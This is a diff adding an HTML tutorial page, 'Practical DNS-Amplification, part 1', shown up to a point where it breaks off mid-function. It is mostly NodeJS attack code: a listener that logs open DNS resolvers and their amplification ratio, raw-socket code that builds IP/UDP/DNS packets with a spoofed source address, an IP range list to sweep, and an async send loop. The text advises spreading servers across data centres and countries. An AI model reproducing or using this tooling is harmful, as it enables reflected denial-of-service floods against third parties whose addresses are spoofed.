@@ -1,0 +1,390 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+	<head>
+		<META http-equiv="Content-Type" content="text/html; charset=windows-1251">
+		<link rel="stylesheet" type="text/css" href="style/style.css">
+		<title> Practical DNS-Amplification, part 1 </title>
+	</head>
+
+	<body>
+	<table cellpadding="25" align="center" >
+			<tr>
+				<td>
+					<h2><span class="header">Practical DNS-Amplification, part 1</span></h2>
+					<br>
+					<h3><span class="warning">More efficient hosts scanning</span></h3>
+					<p class="text">Previously described step restricts from rapid increase in power due to:</p>
+					<ul>
+					<li>if DNS reponded to YOUR direct request, this doen't mean DNS surely gets packet with spoofed IP; </li>
+					<li>scanning from a single host uses both upstream and downstream bandwidth so there's some packet loss in DNS responses.</li> 
+					</ul>
+					<p class="text">More efficient approach is to scan from 2 servers, one dedicated to receiving packets from DNS, while
+another sends spoofed IP packets to DNS. It is mandatory that servers must be allocated in different 
+data-centers, different countries preferred. There may be one or several spoofing servers. I checked with 2 spoofing and one receiving servers.</p>
+					<p class="text"><span class="warning">NodeJS</span> applications are used to receive and send packets. Let's call receiving side the 
+					<span class="warning">"client". </span> It is crucially simplified. Functional example:</p>
+					<ul>
+					<li>create UDP server listening 5353 port <span class="warning">( dgram.createSocket("udp4") \ server.bind(5353);)</span></li>
+					<li>incoming packets sorted by size;</li>
+					<li> If packet size fits (over 200-300 bytes), source host is written to a log <span class="warning">(fs.createWriteStream \ write);</span></li>
+					</ul>
+					
+					
+					
+<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> dgram <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'dgram'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #003366; font-weight: bold;">var</span> fs <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'fs'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #003366; font-weight: bold;">var</span> dns <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'dns'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #003366; font-weight: bold;">var</span> util <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'util'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">var</span> ws <span style="color: #339933;">=</span> fs.<span style="color: #660066;">createWriteStream</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;incoming_ips.txt&quot;</span><span style="color: #339933;">,</span> <span style="color: #009900;">&#123;</span>
+ flags<span style="color: #339933;">:</span> <span style="color: #3366CC;">'w+'</span>
+<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">var</span> server <span style="color: #339933;">=</span> dgram.<span style="color: #660066;">createSocket</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;udp4&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> getPercent<span style="color: #009900;">&#40;</span>total<span style="color: #339933;">,</span> amount<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> <span style="color: #009900;">&#40;</span>amount <span style="color: #339933;">*</span> <span style="color: #CC0000;">100</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">/</span> total<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+server.<span style="color: #660066;">on</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'error'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+ console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'server error'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+server.<span style="color: #660066;">on</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'message'</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>msg<span style="color: #339933;">,</span> rinfo<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span>msg.<span style="color: #660066;">length</span> <span style="color: #339933;">&gt;</span> <span style="color: #CC0000;">100</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  <span style="color: #003366; font-weight: bold;">var</span> line <span style="color: #339933;">=</span> util.<span style="color: #660066;">format</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;%d:%s:%d:%d&quot;</span><span style="color: #339933;">,</span> 
+   msg.<span style="color: #660066;">length</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">address</span><span style="color: #339933;">,</span> rinfo.<span style="color: #660066;">port</span><span style="color: #339933;">,</span> 
+   getPercent<span style="color: #009900;">&#40;</span><span style="color: #CC0000;">17</span><span style="color: #339933;">,</span> msg.<span style="color: #660066;">length</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span>line<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  ws.<span style="color: #000066; font-weight: bold;">write</span><span style="color: #009900;">&#40;</span>line <span style="color: #339933;">+</span> <span style="color: #3366CC;">'n'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+<span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+server.<span style="color: #660066;">bind</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">5353</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+console.<span style="color: #660066;">log</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'NS Client started'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>
+
+
+
+					<p class="text">This code will capture all of our logged packets, and the log would be parser friendly.
+A separate server would be introduced as a string: <span class="warning"> packet_size:DNS_IP:amplification_ratio</span></p><br>
+
+					<h3><span class="warning">Spoofing part</span></h3>
+					<p class="text">Spoofing part is coded using <span class="warning">node-raw-socket</span> UNIX-sockets wrapper for *nix that allows to
+craft custom IP headers for outgoing packets. Of course this requires root priveleges.
+The principle is simple. We have crafted DNS request packet, along with IP header and UDP packet with <span class="warning">DNS-query</span> payload:</p>
+
+
+
+<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> buffer <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">new</span> Buffer <span style="color: #009900;">&#40;</span><span style="color: #009900;">&#91;</span>
+ <span style="color: #006600; font-style: italic;">//--------- IP packet ----------</span>
+ 0x45<span style="color: #339933;">,</span>  
+ 0x00<span style="color: #339933;">,</span> 
+ 0x00<span style="color: #339933;">,</span> 0x25<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//length </span>
+ 0x7c<span style="color: #339933;">,</span> 0x9b<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//ID </span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//flagsfragment offset</span>
+ 0x80<span style="color: #339933;">,</span>  <span style="color: #006600; font-style: italic;">//TTL </span>
+ 0x11<span style="color: #339933;">,</span>  <span style="color: #006600; font-style: italic;">//protocol </span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//crc</span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//source IP</span>
+ 0xc0<span style="color: #339933;">,</span> 0xa8<span style="color: #339933;">,</span> 0x41<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//dest IP</span>
+ <span style="color: #006600; font-style: italic;">//--------- 8 bytes  of UDP packet ----------</span>
+ 0x14<span style="color: #339933;">,</span> 0xE9<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//sender port</span>
+ 0x00<span style="color: #339933;">,</span> 0x35<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//target port</span>
+ 0x00<span style="color: #339933;">,</span> 0x19<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//data length</span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//crc</span>
+ <span style="color: #006600; font-style: italic;">//--------- 17 bytes of DNS packet ----------     </span>
+    0x00<span style="color: #339933;">,</span> 0x03<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>0x01<span style="color: #339933;">,</span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>
+    0x1C<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x01
+<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>
+
+
+
+					<p class="text">All we need is to insert addresses into IP header: </p>
+					<ul>
+					<li><span class="warning">src_ip</span> - packet receiver IP (client)</li>
+					<li><span class="warning">dst_ip</span> - potentially vulnerable DNS IP</li>
+					</ul>
+					<p class="text">Source port 5353 used in UDP packet is the same port client listens to.
+Checksums are set to 0 for OS stack to recalculate checksums while sending packets.</p><br>
+					
+					<h3><span class="warning">Where to get IP addresses?</span></h3>
+					<p class="text">Random generated numbers shows good results, and it's possible to scan countries' ranges.
+I took listed ranges:</p>
+
+<PRE>
+3.0.0.0-3.103.8.36
+3.103.8.38-4.18.65.255
+4.18.68.0-4.28.83.255
+4.28.85.0-4.31.64.63
+4.31.64.72-4.59.175.255
+4.59.177.0-4.68.23.139
+4.68.23.141-4.68.23.189
+4.68.23.191-4.68.25.1
+4.68.25.4-4.68.115.255
+4.68.118.0-4.69.131.255
+4.69.132.53-4.69.132.53
+4.69.132.61-4.69.132.61
+4.69.132.65-4.69.132.65
+</PRE>
+
+					<p class="text">and explored them subsequently. It is important to provide subsequent packet flow on
+asynchronous architecture. To ensure this a spike was made proven rather stable, loading
+20 megabits of 100 available and not blocking node's event pool.<br>
+A shortened spike:</p>
+
+
+
+<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">function</span> repeater<span style="color: #009900;">&#40;</span>diapasons<span style="color: #339933;">,</span> nextIp <span style="color: #339933;">,</span> endIp<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+ async<span style="color: #009900;">&#40;</span><span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span> 
+  process.<span style="color: #660066;">nextTick</span><span style="color: #009900;">&#40;</span><span style="color: #003366; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+   repeater<span style="color: #009900;">&#40;</span>diapasons<span style="color: #339933;">,</span> current_ip <span style="color: #339933;">+</span> <span style="color: #CC0000;">1</span><span style="color: #339933;">,</span> endIp<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+  <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+ <span style="color: #009900;">&#125;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+repeater<span style="color: #009900;">&#40;</span>undefined<span style="color: #339933;">,</span> undefined<span style="color: #339933;">,</span> undefined<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre>
+
+
+
+					<p class="text">It requires raw-socket module to execute: <span class="warning">npm install raw-socket</span><br>
+Spoofing part code:</p>
+
+
+
+<pre class="javascript" style="font-family:monospace; font-size: 80%; background: #e8e8e8;"><span style="color: #003366; font-weight: bold;">var</span> raw <span style="color: #339933;">=</span> require <span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;raw-socket&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #003366; font-weight: bold;">var</span> fs <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'fs'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #003366; font-weight: bold;">var</span> dns <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'dns'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #003366; font-weight: bold;">var</span> util <span style="color: #339933;">=</span> require<span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'util'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">var</span> options <span style="color: #339933;">=</span> <span style="color: #009900;">&#123;</span>
+    protocol<span style="color: #339933;">:</span> raw.<span style="color: #660066;">Protocol</span>.<span style="color: #660066;">UDP</span><span style="color: #339933;">,</span>
+    bufferSize<span style="color: #339933;">:</span> <span style="color: #CC0000;">4096</span><span style="color: #339933;">*</span><span style="color: #CC0000;">8</span>
+<span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">var</span> socket <span style="color: #339933;">=</span> raw.<span style="color: #660066;">createSocket</span> <span style="color: #009900;">&#40;</span>options<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+socket.<span style="color: #660066;">setOption</span> <span style="color: #009900;">&#40;</span>raw.<span style="color: #660066;">SocketLevel</span>.<span style="color: #660066;">IPPROTO_IP</span><span style="color: #339933;">,</span> 
+raw.<span style="color: #660066;">SocketOption</span>.<span style="color: #660066;">IP_HDRINCL</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">new</span> Buffer <span style="color: #009900;">&#40;</span><span style="color: #009900;">&#91;</span>0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x01<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">4</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+&nbsp;
+<span style="color: #003366; font-weight: bold;">var</span> buffer <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">new</span> Buffer <span style="color: #009900;">&#40;</span><span style="color: #009900;">&#91;</span>
+ <span style="color: #006600; font-style: italic;">//--------- IP packet ----------</span>
+ 0x45<span style="color: #339933;">,</span>  
+ 0x00<span style="color: #339933;">,</span> 
+ 0x00<span style="color: #339933;">,</span> 0x25<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//length </span>
+ 0x7c<span style="color: #339933;">,</span> 0x9b<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//ID </span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//flagsfragment offset</span>
+ 0x80<span style="color: #339933;">,</span>  <span style="color: #006600; font-style: italic;">//TTL </span>
+ 0x11<span style="color: #339933;">,</span>  <span style="color: #006600; font-style: italic;">//protocol </span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//crc</span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//source IP</span>
+ 0xc0<span style="color: #339933;">,</span> 0xa8<span style="color: #339933;">,</span> 0x41<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//dest IP</span>
+ <span style="color: #006600; font-style: italic;">//--------- 8 bytes  of UDP packet ----------</span>
+ 0x14<span style="color: #339933;">,</span> 0xE9<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//sender port</span>
+ 0x00<span style="color: #339933;">,</span> 0x35<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//target port</span>
+ 0x00<span style="color: #339933;">,</span> 0x19<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//data length</span>
+ 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> <span style="color: #006600; font-style: italic;">//crc</span>
+ <span style="color: #006600; font-style: italic;">//--------- 17 bytes of DNS packet ----------     </span>
+    0x00<span style="color: #339933;">,</span> 0x03<span style="color: #339933;">,</span> 0x01<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>0x01<span style="color: #339933;">,</span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>
+    0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span>
+    0x1C<span style="color: #339933;">,</span> 0x00<span style="color: #339933;">,</span> 0x01
+<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip2long <span style="color: #009900;">&#40;</span> ip_address <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>    
+    <span style="color: #003366; font-weight: bold;">var</span> output <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">false</span><span style="color: #339933;">;</span>
+    <span style="color: #003366; font-weight: bold;">var</span> parts <span style="color: #339933;">=</span> <span style="color: #009900;">&#91;</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">if</span> <span style="color: #009900;">&#40;</span>ip_address.<span style="color: #660066;">match</span><span style="color: #009900;">&#40;</span><span style="color: #009966; font-style: italic;">/^d{1,3}.d{1,3}.d{1,3}.d{1,3}$/</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        parts  <span style="color: #339933;">=</span> ip_address.<span style="color: #660066;">split</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'.'</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+        output <span style="color: #339933;">=</span> <span style="color: #009900;">&#40;</span> parts<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">0</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">16777216</span> <span style="color: #339933;">+</span>
+        <span style="color: #009900;">&#40;</span> parts<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">1</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">65536</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span>
+        <span style="color: #009900;">&#40;</span> parts<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">2</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">256</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span>
+        <span style="color: #009900;">&#40;</span> parts<span style="color: #009900;">&#91;</span><span style="color: #CC0000;">3</span><span style="color: #009900;">&#93;</span> <span style="color: #339933;">*</span> <span style="color: #CC0000;">1</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+&nbsp;
+    <span style="color: #000066; font-weight: bold;">return</span> output<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> long2ip <span style="color: #009900;">&#40;</span> proper_address <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #003366; font-weight: bold;">var</span> output <span style="color: #339933;">=</span> <span style="color: #003366; font-weight: bold;">false</span><span style="color: #339933;">;</span>
+&nbsp;
+    <span style="color: #000066; font-weight: bold;">if</span> <span style="color: #009900;">&#40;</span> <span style="color: #339933;">!</span>isNaN <span style="color: #009900;">&#40;</span> proper_address <span style="color: #009900;">&#41;</span> <span style="color: #339933;">&amp;&amp;</span> <span style="color: #009900;">&#40;</span> proper_address <span style="color: #339933;">&gt;=</span> <span style="color: #CC0000;">0</span> <span style="color: #339933;">||</span> 
+	proper_address <span style="color: #339933;">&lt;=</span> <span style="color: #CC0000;">4294967295</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+  output <span style="color: #339933;">=</span> Math.<span style="color: #660066;">floor</span> <span style="color: #009900;">&#40;</span>proper_address <span style="color: #339933;">/</span> Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #3366CC;">'.'</span> <span style="color: #339933;">+</span>
+   Math.<span style="color: #660066;">floor</span> <span style="color: #009900;">&#40;</span> <span style="color: #009900;">&#40;</span> proper_address <span style="color: #339933;">%</span> Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">/</span> 
+   Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #3366CC;">'.'</span> <span style="color: #339933;">+</span>
+   Math.<span style="color: #660066;">floor</span> <span style="color: #009900;">&#40;</span> <span style="color: #009900;">&#40;</span> <span style="color: #009900;">&#40;</span> proper_address <span style="color: #339933;">%</span> Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span>  <span style="color: #339933;">%</span> 
+   Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">/</span> Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">1</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">+</span> <span style="color: #3366CC;">'.'</span> <span style="color: #339933;">+</span>
+   Math.<span style="color: #660066;">floor</span> <span style="color: #009900;">&#40;</span> <span style="color: #009900;">&#40;</span> <span style="color: #009900;">&#40;</span> <span style="color: #009900;">&#40;</span> proper_address <span style="color: #339933;">%</span> Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">3</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">%</span> 
+   Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">%</span> Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">1</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span> <span style="color: #339933;">/</span> 
+   Math.<span style="color: #660066;">pow</span> <span style="color: #009900;">&#40;</span> <span style="color: #CC0000;">256</span><span style="color: #339933;">,</span> <span style="color: #CC0000;">0</span> <span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+&nbsp;
+    <span style="color: #000066; font-weight: bold;">return</span> output<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> rand<span style="color: #009900;">&#40;</span>max<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> Math.<span style="color: #660066;">floor</span><span style="color: #009900;">&#40;</span>Math.<span style="color: #660066;">random</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">*</span>max<span style="color: #009900;">&#41;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip_packet_length<span style="color: #009900;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>newval<span style="color: #009900;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  buff.<span style="color: #660066;">writeUInt16BE</span><span style="color: #009900;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt16BE</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">2</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip_packet_id<span style="color: #009900;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>newval<span style="color: #009900;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  buff.<span style="color: #660066;">writeUInt16BE</span><span style="color: #009900;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">4</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt16BE</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">4</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip_packet_ttl<span style="color: #009900;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+&nbsp;
+ <span style="color: #000066; font-weight: bold;">if</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span><span style="color: #009900;">&#40;</span>newval<span style="color: #009900;">&#41;</span> <span style="color: #339933;">!==</span> <span style="color: #3366CC;">'undefined'</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+  buff.<span style="color: #660066;">writeUInt8</span><span style="color: #009900;">&#40;</span>newval<span style="color: #339933;">,</span> <span style="color: #CC0000;">8</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span> 
+ <span style="color: #009900;">&#125;</span>
+ <span style="color: #000066; font-weight: bold;">return</span> buff.<span style="color: #660066;">readUInt8</span><span style="color: #009900;">&#40;</span><span style="color: #CC0000;">8</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+&nbsp;
+&nbsp;
+<span style="color: #003366; font-weight: bold;">function</span> ip_packet_proto<span style="color: #009900;">&#40;</span>buff<span style="color: #339933;">,</span> newval<span style="color: #009900;">&#41;</span><span style="color: #009900;">&#123;</span>
+&nbsp;
